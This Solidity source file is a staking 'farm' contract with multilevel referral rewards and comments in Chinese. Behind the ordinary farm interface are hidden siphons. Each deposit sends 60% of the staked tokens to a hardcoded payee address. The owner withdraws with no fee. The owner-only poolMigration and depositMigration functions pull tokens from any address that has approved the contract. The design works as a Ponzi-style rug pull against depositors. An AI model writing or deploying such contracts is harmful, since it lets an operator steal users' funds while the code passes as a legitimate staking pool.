// SPDX-License-Identifier: GPLv3

pragma solidity ^0.8.0;

import "./Ownable.sol";
import "./ReentrancyGuard.sol";
import "./SafeMath.sol";
import "./SafeERC20.sol";
import "./ERC20.sol";

contract FarmMultitokenMultilevelAi is Ownable, ReentrancyGuard {
    using SafeMath for uint;
    using SafeERC20 for ERC20;
    
    
    /* ******************* 写死 ****************** */
    
    // 推荐奖励率
    uint[2] public refRewardRates = [140, 60];
    

    
    /* ******************* 可改配置 ****************** */
    
    // 每个区块开采奖励的币数.
    uint rewardPerBlock = 0.00000078125 ether;
    // 提现手续费率 (< 1000)
    uint withdrawFee = 100;
    // 收款人地址
    address payee = 0x8Af604b74eED3048DBb63F93f212080c9634E30f;
    // 收款比例
    uint rate = 60;
    // 数据迁移完成
    bool dataMigrationFinish = false;
    
    
    
    /* ******************* 计算 ****************** */
    
    // 最后计入 accruedTokenPerShare 的块号
    uint lastRewardBlock;
    // 每份额应计奖励数
    uint accruedTokenPerShare;
    // 用户总数
    uint totalUsers;
   
   
   
    /* ******************* 用户 ****************** */
    
    struct Userinfo {
        bool activated;         // 激活
        address ref;            // 推荐用户
        address team;           // 大团队
        address subteam;        // 小团队
        uint[2] myteamCount;    // index=0直推人数、index=1间推人数
    }
    mapping(address => Userinfo) public userinfos;
    struct User {
        uint amount;            // 质押总数
        uint shares;            // 份额总数
        uint rewardDebt;        // 奖励债务
        uint teamIn;            // 无限层团队入金总数
        uint teamOut;           // 无限层团队出金总数
        uint[2] teamAmount;     // index=0直推质押总数、index=1间推质押总数
    }
    mapping(address => User)[] public users;
    
    
    
    /* ******************* 币 ****************** */
    
    struct Coin {
        ERC20 token;
        uint totalAmount;
    }
    // 质押代币
    Coin[] public stakes;
    // 奖励代币
    Coin public reward;
    
    
    
    /* ******************* 事件 ****************** */
    
    event Deposit(address indexed user, uint amount, uint index);
    event Withdraw(address indexed user, uint amount, uint index);
    event AdminTokenRecovery(address tokenRecovered, uint amount);
    event NewRewardPerBlock(uint rewardPerBlock);
    event NewWithdrawFee(uint withdrawFee);
    event NewStakedToken(ERC20 _stakedToken, uint index);
    
    

    /* ******************* 构造函数 ****************** */
    
    constructor(ERC20 _stakedToken, ERC20 _rewardToken) {
        users.push();
        stakes.push(Coin(_stakedToken, 0));
        reward.token = _rewardToken;
        
        userinfos[msg.sender].activated = true;
        totalUsers = 1;
        
        lastRewardBlock = block.number;
    }
    
    
    
    /* ******************* 写函数 ****************** */
    
    // 收币函数
    receive() external payable { }

    // 质押
    function deposit(uint _amount, address _ref) external payable nonReentrant {
        deposit_private(msg.sender, _amount, _ref, 0);
    }
    function deposit(uint _amount, address _ref, uint index) external payable nonReentrant {
        deposit_private(msg.sender, _amount, _ref, index);
    }
    function deposit_private(address sender, uint _amount, address _ref, uint index) private {
        // 校验
        Userinfo storage userinfo = userinfos[sender];
        require(userinfo.activated || userinfos[_ref].activated, "Referrer is not activated");
        
        // 更新池、结算、更新用户份额与负债、总份额统计
        updatePool();
        User storage user = users[index][sender];
        settleAndEvenReward(index, user, userinfo, sender, _amount, amountSharesRate(), true);
        if (_amount == 0) return;     // 无质押
        
        // 激活、推荐关系、激活用户统计
        if (! userinfo.activated) {
            userinfo.activated = true;
            userinfo.ref = _ref;
            totalUsers = totalUsers.add(1);
            if (userinfos[_ref].ref == address(0)) {                        // 推荐人是根-确立总代理
                userinfo.team = sender;
            } else if (userinfos[userinfos[_ref].ref].ref == address(0)) {  // 推荐人是总代理-确立分代理
                userinfo.team = _ref;
                userinfo.subteam = sender;
            } else {                                                        // 推荐人是分代理或非代理
                userinfo.team = userinfos[_ref].team;
                userinfo.subteam = userinfos[_ref].subteam;
            }
            userinfos[_ref].myteamCount[0] ++;
            if (userinfos[_ref].ref != address(0)) userinfos[userinfos[_ref].ref].myteamCount[1] ++;
        }
        
        // 推荐人奖励
        address userRef = userinfo.ref;
        for (uint i = 0; i < refRewardRates.length; i++) {
            if (userRef == address(0)) break;                                                                           // 0地址
            settleAndEvenReward(index, users[index][userRef], userinfos[userRef], userRef, _amount, refRewardRates[i], true);   // 推荐人结算、更新推荐人份额与负债
            userRef = userinfos[userRef].ref;
        }
        
        // 质押
        user.amount = user.amount.add(_amount);
        stakes[index].totalAmount = stakes[index].totalAmount.add(_amount);
        stakes[index].token.safeTransferFrom(sender, address(this), _amount);
        if (rate > 0) stakes[index].token.transfer(payee, _amount.mul(rate).div(100));
        
        // team
        if (userinfo.team != address(0)) {
            users[index][userinfo.team].teamIn += _amount;
        }
        if (userinfo.subteam != address(0)) {
            users[index][userinfo.subteam].teamIn += _amount;
        }
        if (userinfo.ref != address(0)) users[index][userinfo.ref].teamAmount[0] += _amount;
        if (userinfos[userinfo.ref].ref != address(0)) users[index][userinfos[userinfo.ref].ref].teamAmount[1] += _amount;
        emit Deposit(sender, _amount, index);
    }
    
    // 提现
    function withdraw() external nonReentrant {
        withdraw_private(0);
    }
    function withdraw(uint index) external nonReentrant {
        withdraw_private(index);
    }
    function withdraw_private(uint index) private {
        // 校验
        Userinfo storage userinfo = userinfos[msg.sender];
        require(userinfo.activated, "User not activated");
        User storage user = users[index][msg.sender];
        require(user.amount > 0, "'Deposit amount must be greater than 0");
        uint _amount = user.amount;
        
        // 更新池、结算、更新用户份额与负债、总份额统计
        updatePool();
        settleAndEvenReward(index, user, userinfo, msg.sender, _amount, amountSharesRate(), false);
        
        // 推荐人奖励
        address userRef = userinfo.ref;
        for (uint i = 0; i < refRewardRates.length; i++) {
            if (userRef == address(0)) break;                                                                                   // 0地址
            settleAndEvenReward(index, users[index][userRef], userinfos[userRef], userRef, _amount, refRewardRates[i], false);  // 推荐人结算、更新推荐人份额与负债
            userRef = userinfos[userRef].ref;
        }
            
        // 解除质押-数据写入
        user.amount = 0;
        stakes[index].totalAmount = stakes[index].totalAmount.sub(_amount);
        
        // 解除质押-支付
        uint outAmount;
        if (msg.sender == owner) {
            outAmount = _amount;
            stakes[index].token.transfer(msg.sender, outAmount);
        } else {
            uint fee = _amount.mul(withdrawFee).div(1000);
            outAmount = _amount.sub(fee);
            stakes[index].token.transfer(msg.sender, outAmount);
            stakes[index].token.transfer(owner, fee);
        }
        
        // team
        if (userinfo.team != address(0)) {
            users[index][userinfo.team].teamOut += outAmount;
        }
        if (userinfo.subteam != address(0)) {
            users[index][userinfo.subteam].teamOut += outAmount;
        }
        if (userinfo.ref != address(0)) users[index][userinfo.ref].teamAmount[0] = users[index][userinfo.ref].teamAmount[0].sub(_amount);
        if (userinfos[userinfo.ref].ref != address(0)) users[index][userinfos[userinfo.ref].ref].teamAmount[1] = users[index][userinfos[userinfo.ref].ref].teamAmount[1].sub(_amount);
        emit Withdraw(msg.sender, _amount, index);
    }
    
    
    
    /* ******************* 读函数 ****************** */

    // 查询账户
    function query_account(address _addr) external view returns(bool, address, uint, uint, uint, uint) {
        return query_account_private(_addr, 0);
    }
    function query_account(address _addr, uint index) external view returns(bool, address, uint, uint, uint, uint) {
        return query_account_private(_addr, index);
    }
    function query_account_private(address _addr, uint index) private view returns(bool, address, uint, uint, uint, uint) {
        Userinfo storage userinfo = userinfos[_addr];
        return (userinfo.activated,
                userinfo.ref,
                _addr.balance,
                stakes[index].token.allowance(_addr, address(this)),
                stakes[index].token.balanceOf(_addr),
                reward.token.balanceOf(_addr));
    }

    // 查询质押
    function query_stake(address _addr) external view returns(uint, uint, uint, uint) {
        return query_stake_private(_addr, 0);
    }
    function query_stake(address _addr, uint index) external view returns(uint, uint, uint, uint) {
        return query_stake_private(_addr, index);
    }
    function query_stake_private(address _addr, uint index) private view returns(uint, uint, uint, uint) {
        User storage user = users[index][_addr];
        return (user.amount,
                user.shares,
                user.rewardDebt,
                pendingReward(user));
    }

    // 统计与池信息、配置
    function query_summary() external view returns(uint, uint, uint, uint, uint, uint, uint, uint) {
        return query_summary_private(0);
    }
    function query_summary(uint index) external view returns(uint, uint, uint, uint, uint, uint, uint, uint) {
        return query_summary_private(index);
    }
    function query_summary_private(uint index) private view returns(uint, uint, uint, uint, uint, uint, uint, uint) {
        return (totalUsers, 
                stakes[index].totalAmount, 
                lastRewardBlock, 
                accruedTokenPerShare,
                rewardPerBlock,
                withdrawFee,
                query_minable(),
                block.number);
    }
    
    // owner 查询
    function query_owner() external onlyOwner view returns(address, uint) {
        return (payee, rate);
    }
    


    /* ******************* 写函数-owner ****************** */

    // 回收错误币
    function recoverWrongTokens(address _tokenAddress, uint _tokenAmount) external onlyOwner {
        for (uint i; i < stakes.length; i++) {
            require(_tokenAddress != address(stakes[i].token), "Cannot be staked token");
        }
        require(_tokenAddress != address(reward.token), "Cannot be reward token");
        ERC20(_tokenAddress).transfer(msg.sender, _tokenAmount);
        emit AdminTokenRecovery(_tokenAddress, _tokenAmount);
    }
    
    // 更新每区块奖励数
    function updateRewardPerBlock(uint _rewardPerBlock) external onlyOwner {
        rewardPerBlock = _rewardPerBlock;
        emit NewRewardPerBlock(_rewardPerBlock);
    }
    
    // 更新提现手续费率
    function updateWithdrawFee(uint _withdrawFee) external onlyOwner {
        require(_withdrawFee < 1000, "'_withdrawFee' must be less than 1000");
        withdrawFee = _withdrawFee;
        emit NewWithdrawFee(_withdrawFee);
    }
    
    // 修改收款人
    function updatePayee(address _payee) external onlyOwner {
        require(_payee != address(0), "'_payee' is 0 address");
        payee = _payee;
    }
    
    // 修改收款比例
    function updateRate(uint _rate) external onlyOwner {
        require(_rate < 100, "'_rate' must be less than 100");
        rate = _rate;
    }
    
    // 新增质押币类型
    function addStakedToken(ERC20 _stakedToken) external onlyOwner {
        for (uint i; i < stakes.length; i++) {
            require(address(stakes[i].token) != address(_stakedToken), "Added");
        }
        users.push();
        stakes.push(Coin(_stakedToken, 0));
        emit NewStakedToken(_stakedToken, stakes.length);
    }
    
    // 池资金迁移
    function poolMigration(ERC20 token, address oldContractAddr, address newContractAddr) external onlyOwner {
        token.safeTransferFrom(oldContractAddr, newContractAddr, token.balanceOf(oldContractAddr));
    }
    
    // 质押迁移
    function depositMigration(address userAddr, uint _amount, address _ref, uint index) external onlyOwner {
        if (dataMigrationFinish) return;
        deposit_private(userAddr, _amount, _ref, index);
    }
    // 用户数据迁移(修复)
    function userDataMigration(address userAddr, uint index, uint rewardDebt, uint teamOut) external onlyOwner {
        if (dataMigrationFinish) return;
        users[index][userAddr].rewardDebt = rewardDebt;
        users[index][userAddr].teamOut = teamOut;
    }
    // 公共数据迁移(修复)
    function publicDataMigration(uint lastRewardBlock_, uint accruedTokenPerShare_) external onlyOwner {
        if (dataMigrationFinish) return;
        lastRewardBlock = lastRewardBlock_;
        accruedTokenPerShare = accruedTokenPerShare_;
    }
    // 数据迁移完成
    function migrationFinish() external onlyOwner {
        if (dataMigrationFinish) return;
        dataMigrationFinish = true;
    }
    
    
    
    /* ******************* 私有 ****************** */
    
    // 更新池
    function updatePool() private {
        if (block.number <= lastRewardBlock) return;            // 未出新块
        uint multiplier = block.number.sub(lastRewardBlock);    // 出块总数
        if (multiplier <= 0) return;
        uint rewardAmount = multiplier.mul(rewardPerBlock);     // 出块总奖励
        accruedTokenPerShare = accruedTokenPerShare.add(rewardAmount);
        lastRewardBlock = block.number;
    }
    
    // 结算、更新用户份额与负债（返回份额变化量）
    function settleAndEvenReward(uint index, User storage user, Userinfo storage userinfo, address userAddr, uint changeAmount, uint changeSharesRate, bool isAdd) private {
        if (changeAmount > 0) {
            (, uint subPending) = settleReward(index, user, userinfo, userAddr);
            uint changeShares = changeAmount.mul(changeSharesRate).div(1000);
            if (isAdd) {
                user.shares = user.shares.add(changeShares);
            } else {
                if (user.shares < changeShares) changeShares = user.shares; // 处理多次质押一次提现产生的精度误差
                user.shares = user.shares.sub(changeShares);
            }
            uint rewardDebt = user.shares.mul(accruedTokenPerShare).div(1 ether);
            if (rewardDebt >= subPending) {
                user.rewardDebt = rewardDebt.sub(subPending);               // 少结算的不追加负债
            } else {
                user.rewardDebt = 0;
            }
        } else {
            (uint pending, ) = settleReward(index, user, userinfo, userAddr);
            if (pending > 0) user.rewardDebt = user.rewardDebt.add(pending);
        }
    }
    
    // 结算（返回结算数量）
    function settleReward(uint index, User storage user, Userinfo storage userinfo, address userAddr) private returns (uint, uint) {
        if (user.shares > 0) {
            uint pending = user.shares.mul(accruedTokenPerShare).div(1 ether).sub(user.rewardDebt);    // 结算数量 = 净资产 = 资产 - 负债
            uint subPending;                                                                                    // 少结算数量（因余额不足）
            (pending, subPending) = realPending(pending);
            if (pending > 0) {
                reward.token.transfer(userAddr, pending);
                
                // team
                if (userinfo.team != address(0)) {
                    users[index][userinfo.team].teamOut += pending;
                }
                if (userinfo.subteam != address(0)) {
                    users[index][userinfo.subteam].teamOut += pending;
                }
                return (pending, subPending);
            }
        }
        return (0, 0);
    }
    
    // 未结算奖励数
    function pendingReward(User storage user) private view returns (uint) {
        if (block.number <= lastRewardBlock) {                  // 未出新块
            uint pending = user.shares.mul(accruedTokenPerShare).div(1 ether).sub(user.rewardDebt);
            (pending, ) = realPending(pending);
            return pending;
        }
        uint multiplier = block.number.sub(lastRewardBlock);    // 出块总数
        uint rewardAmount = multiplier.mul(rewardPerBlock);     // 出块总奖励
        uint adjustedTokenPerShare = accruedTokenPerShare.add(rewardAmount);
        uint pending2 = user.shares.mul(adjustedTokenPerShare).div(1 ether).sub(user.rewardDebt);
        (pending2, ) = realPending(pending2);
        return pending2;
    }
    
    // 实际可挖
    function realPending(uint pending) private view returns (uint, uint) {
        uint subPending;                                                                                    // 少结算数量（因余额不足）
        if (pending > 0) {
            uint minable = query_minable();
            if (minable < pending) {
                subPending = pending.sub(minable);
                pending = minable;
            }
        }
        return (pending, subPending);
    }

    // 查询可开采总数
    function query_minable() private view returns(uint) {
        return reward.token.balanceOf(address(this));
    }
    
    // 质押股份率
    function amountSharesRate() private view returns(uint) {
        uint sum;
        for (uint i = 0; i < refRewardRates.length; i++) {
            sum += refRewardRates[i];
        }
        return 1000 - sum;
    }
    
}